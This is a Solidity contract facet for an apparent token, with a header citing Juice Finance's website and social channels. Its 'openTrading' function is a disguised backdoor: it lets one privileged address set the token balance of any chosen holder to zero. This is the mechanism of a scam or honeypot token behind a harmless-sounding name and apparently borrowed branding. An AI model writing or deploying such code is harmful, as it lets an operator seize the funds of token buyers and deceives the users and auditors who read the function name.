/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.juice.finance/
 * Whitepaper: https://juice-finance.gitbook.io/juice-finance
 * Twitter: https://twitter.com/Juice_Finance
 * Telegram Group: https://t.me/Juice_Finance
 * Discord Chat: https://discord.gg/juicefinance
 */
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
